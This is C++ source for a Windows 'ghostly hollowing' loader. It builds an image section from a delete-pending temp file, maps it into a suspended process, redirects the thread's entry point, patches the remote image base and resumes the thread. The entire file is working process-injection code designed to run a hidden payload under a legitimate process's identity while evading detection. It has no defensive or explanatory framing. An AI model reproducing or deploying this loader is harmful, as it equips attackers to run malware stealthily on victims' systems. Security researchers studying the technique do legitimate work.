#include <HollowingVariations.h>
#include <iostream>

DWORD GetEntryPointOffset(_In_ LPVOID PayloadAddress)
{	
	PIMAGE_NT_HEADERS NTHeaders{ (PIMAGE_NT_HEADERS)((PBYTE)PayloadAddress + ((PIMAGE_DOS_HEADER)PayloadAddress)->e_lfanew) };
	if (NTHeaders->Signature != IMAGE_NT_SIGNATURE)
	{
		return NULL;
	}

	return NTHeaders->OptionalHeader.AddressOfEntryPoint;
}

BOOL HijackExecution(_In_ PROCESS_INFORMATION HollowedProcess, _In_ LPVOID RemoteMappingAddress, _In_ DWORD EntryPointOffset)
{
	CONTEXT Context = { .ContextFlags = CONTEXT_ALL };

	if (!NT_SUCCESS(NtGetContextThread(HollowedProcess.hThread, &Context)))
	{
		return FALSE;
	}

	Context.Rcx = (DWORD64)((ULONG_PTR)RemoteMappingAddress + EntryPointOffset);

	LPVOID RemoteImageBase{ (LPVOID)(Context.Rdx + 0x10) };

	if (!NT_SUCCESS(NtSetContextThread(HollowedProcess.hThread, &Context)))
	{
		return FALSE;
	}

	if (!NT_SUCCESS(NtWriteVirtualMemory(HollowedProcess.hProcess, RemoteImageBase, &RemoteMappingAddress, sizeof(ULONGLONG), NULL)))
	{		
		return FALSE;
	}

	return TRUE;
}

HANDLE CreateGhostSection(_In_ HANDLE TempFile)
{	
	IO_STATUS_BLOCK			     StatusBlock{};
	FILE_DISPOSITION_INFORMATION DispositionInformation{ .DeleteFileW = TRUE };

	if (!NT_SUCCESS(NtSetInformationFile(TempFile, &StatusBlock, &DispositionInformation, sizeof(FILE_DISPOSITION_INFORMATION), FileDispositionInformation)))
	{
		return INVALID_HANDLE_VALUE;
	}
	
	HANDLE SectionHandle{};

	if (!NT_SUCCESS(NtCreateSection(&SectionHandle, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, TempFile)))
	{
		return INVALID_HANDLE_VALUE;
	}

	CloseHandle(TempFile);
	return SectionHandle;
}

BOOL GhostlyHollowing(_In_ PROCESS_INFORMATION HollowedProcess, _In_ HANDLE GhostSection, _In_ LPVOID PayloadAddress)
{	
	LPVOID RemoteMappingAddress{};
	SIZE_T RemoteMappingSize{};

	if (!NT_SUCCESS(NtMapViewOfSection(GhostSection, HollowedProcess.hProcess, &RemoteMappingAddress, NULL, NULL, NULL, &RemoteMappingSize, ViewUnmap, NULL, PAGE_READONLY)))
	{
		return FALSE;
	}
	
	DWORD EntryPointOffSet{ GetEntryPointOffset(PayloadAddress) };

	if (!HijackExecution(HollowedProcess, RemoteMappingAddress, EntryPointOffSet))
	{
		return FALSE;
	}

	if (!NT_SUCCESS(NtResumeThread(HollowedProcess.hThread, NULL)))
	{
		return FALSE;
	}

	return TRUE;
}